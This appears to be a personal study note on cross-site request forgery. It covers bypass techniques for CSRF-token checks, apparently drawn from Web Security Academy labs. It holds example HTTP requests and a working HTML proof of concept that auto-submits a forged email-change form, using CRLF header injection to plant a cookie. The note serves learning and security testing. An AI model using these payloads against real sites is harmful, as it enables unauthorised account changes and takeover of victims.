# What is CSRF
Cross-site request forgery is a web security vulnerability that allows an attacker to induce ( force ) users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

# Bypass Methods

## Try to Change Request 
- Method. Depend On Request Method. In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

 ## Validation of CSRF token depends on token being present. 
 - In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

## CSRF token is not tied to the user session
- Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

## CSRF token is tied to a non-session cookie
- In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```
- This situation is **harder** to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

## CSRF where token is tied to non-session cookie


```
POST /my-account/change-email HTTP/2
Host: 0a12008d047b879581e97a1100d20019.web-security-academy.net
Cookie: session=pzPHJ6EPlS183BjFz3DLGo5hlRMYgN4R; csrfKey=vlQeqn1xYCGuSYAEjmlhx0uLIilYStLH

email=wiener%40new.mail&csrf=WoU9OTwuE59g21pxKJxUIjjLKUkaVN3X
```
- In this example **csrf** tied with csrfKey
- Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the csrfKey cookie merely results in the CSRF token being rejected. This suggests that the csrfKey cookie may not be strictly tied to the session.
- If we swap the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted.
- Our final payload is : (<img> tag for putting csrfKey , and submit automaticly )
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a12008d047b879581e97a1100d20019.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener&#64;new&#46;mail" />
      <input type="hidden" name="csrf" value="WoU9OTwuE59g21pxKJxUIjjLKUkaVN3X" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF token is simply duplicated in a cookie (DOUBLE SUBMIT)
- Some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This called "double submit" defense

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```
- In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality.
- The attacker doesn't need to obtain a valid token of their own.
- They simply invent a token  leverage the cookie-setting behavior to place their cookie into the victim's browser.










# CSRF Check List
1. Remove the CSRF token and see if application accept request
2. Change request from POST to GET
3. See if CSRF token is tied to user session
